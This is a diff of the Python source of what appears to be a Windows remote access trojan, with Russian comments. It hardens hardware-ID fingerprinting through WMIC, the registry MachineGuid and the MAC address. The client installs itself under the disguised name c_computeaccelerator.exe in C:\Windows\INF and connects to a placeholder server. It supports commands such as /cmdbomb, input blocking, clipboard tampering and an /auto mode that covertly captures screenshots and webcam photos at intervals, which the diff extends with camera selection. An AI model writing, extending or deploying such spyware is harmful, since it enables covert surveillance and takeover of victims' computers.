@@ -29,35 +29,55 @@ logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(m
 logger = logging.getLogger(__name__)
 
 
-# ====== Автоопределение CLIENT_ID ======
+# ====== Автоопределение CLIENT_ID (ИСПРАВЛЕНО) ======
 def get_hwid():
+    # 1. Попытка через WMIC (UUID материнской платы)
     try:
         cmd = 'wmic csproduct get uuid'
         try:
             oem_cp = f"cp{ctypes.windll.kernel32.GetOEMCP()}"
         except Exception:
-            oem_cp = 'cp866'  # Фоллбэк для русских систем
+            oem_cp = 'cp866'
         output = subprocess.check_output(cmd, shell=True).decode(oem_cp, errors='ignore').strip()
         lines = output.split('\n')
         hwid = lines[1].strip() if len(lines) > 1 else None
         if hwid and hwid != 'UUID':
             return hwid
     except Exception as e:
-        logger.error(f"Ошибка получения HWID: {e}")
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 48, 8)][::-1])
-    return f"fallback-{mac}-{uuid.uuid4().hex[:8]}"
+        logger.error(f"Ошибка получения HWID (WMIC): {e}")
+
+    # 2. Попытка через Реестр (MachineGuid) — Самый надежный fallback
+    # Работает, даже если WMI сломан. ID не меняется до переустановки Windows.
+    try:
+        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
+        guid, _ = reg.QueryValueEx(key, "MachineGuid")
+        reg.CloseKey(key)
+        if guid:
+            return guid
+    except Exception as e:
+        logger.error(f"Ошибка получения HWID (Registry): {e}")
+
+    # 3. Последний шанс: MAC-адрес (Убрали случайный uuid4)
+    # uuid.getnode() получает адрес сетевой карты. Он статичен.
+    try:
+        mac_num = uuid.getnode()
+        return f"mac-{mac_num}"
+    except Exception:
+        pass
+        
+    # 4. Если совсем всё плохо (крайний случай), берем имя пользователя
+    return f"user-{os.getenv('USERNAME', 'unknown')}"
 
 device_name = os.getenv("COMPUTERNAME", "UnknownDevice")
 CLIENT_ID = f"{device_name}/{get_hwid()}"
 logger.info(f"CLIENT_ID: {CLIENT_ID}")
 
 # ====== Настройки подключения ======
-SERVER_IP = "#type"
-SERVER_PORT = 1234
+SERVER_IP = "#!"
+SERVER_PORT = #type
 RECONNECT_DELAY = 5
-
 # ====== Глобальные переменные ======
-CURRENT_VERSION = 1
+CURRENT_VERSION = 17
 TARGET_DIR = r"C:\Windows\INF"
 new_name="c_computeaccelerator.exe"
 stop_event = threading.Event()
@@ -355,6 +375,7 @@ def cmd_ls(args):
         return f"❌ Ошибка при чтении '{target_path}': {e}"
 
 
+
 def cmd_cd(args):
     global current_path
     logger.debug(f"Выполняется /cd с аргументами: {args}")
@@ -621,6 +642,9 @@ def unblock_input(args):
     except Exception as e:
         return f"❌ Ошибка снятия блокировки ввода: {e}"
 
+def cmd_version(args):
+    """Возвращает версию клиента"""
+    return f"Версия клиента: {CURRENT_VERSION}"
 
 def get_clipboard_content(args):
     """Получает текстовое содержимое буфера обмена."""
@@ -1391,7 +1415,7 @@ def cmd_photo(args, conn):
                 logger.error(f"Не удалось удалить временный файл: {e}")
 
 # ====== Auto (Запускается в отдельном потоке) ======
-def auto_job(interval, capture_screen, capture_webcam):
+def auto_job(interval, capture_screen, capture_webcam, camera_index):
     # Эта функция выполняется в отдельном потоке
     while not stop_event.wait(interval):
         try:
@@ -1402,7 +1426,7 @@ def auto_job(interval, capture_screen, capture_webcam):
                     # Вызываем функции, которые сами обрабатывают сокет через socket_lock
                     cmd_screenshot("", conn)
                 if capture_webcam:
-                    cmd_photo("", conn)
+                    cmd_photo(str(camera_index), conn)
         except Exception as e:
             logger.error(f"Auto ошибка: {e}")
             time.sleep(1)
@@ -1413,22 +1437,40 @@ def cmd_auto(args, conn):
     try:
         parts = args.split()
         if not parts:
-            return "❌ /auto <сек> [screen|webcam|both]"
+            return "❌ /auto <сек> [screen|webcam|both] [camera_index]"
+        
         interval = float(parts[0])
         if interval <= 0:
-            return "❌ Интервал >0"
+            return "❌ Интервал > 0"
+
+        # режим: screen / webcam / both
         mode = parts[1].lower() if len(parts) > 1 else "both"
         capture_screen = "screen" in mode or "both" in mode
         capture_webcam = "webcam" in mode or "both" in mode
+
+        # индекс камеры (если есть)
+        camera_index = 0
+        if len(parts) > 2:
+            if parts[2].isdigit():
+                camera_index = int(parts[2])
+            else:
+                return "❌ Индекс камеры должен быть числом."
+
         if auto_thread and auto_thread.is_alive():
             return "❌ Уже запущено (/stop)"
+
         stop_event.clear()
-        # Запускаем auto_job в отдельном потоке
-        auto_thread = threading.Thread(target=auto_job, args=(interval, capture_screen, capture_webcam), daemon=True)
+        auto_thread = threading.Thread(
+            target=auto_job,
+            args=(interval, capture_screen, capture_webcam, camera_index),
+            daemon=True
+        )
         auto_thread.start()
-        return f"✅ Auto каждые {interval}с"
+        return f"✅ Auto каждые {interval}с (камера {camera_index})"
+
     except Exception as e:
         return f"❌ {str(e)}"
+
 
 def cmd_stop(args):
     global auto_thread
@@ -1966,6 +2008,7 @@ COMMANDS = {
     "/changeclipboard": cmd_changeclipboard,
     "/minimize": cmd_minimize,
     "/maximize": cmd_maximize,
+    "/version": cmd_version,
     "/cmdbomb": cmd_cmdbomb,
     "/altf4": cmd_altf4,
     "/restart": cmd_restart, 
@@ -2168,7 +2211,6 @@ def main_client_loop():
 
 if __name__ == "__main__":
     copy_to_target()
-    change_shell()
     delete_mei()
     kill_parent_stub()
     main_client_loop()
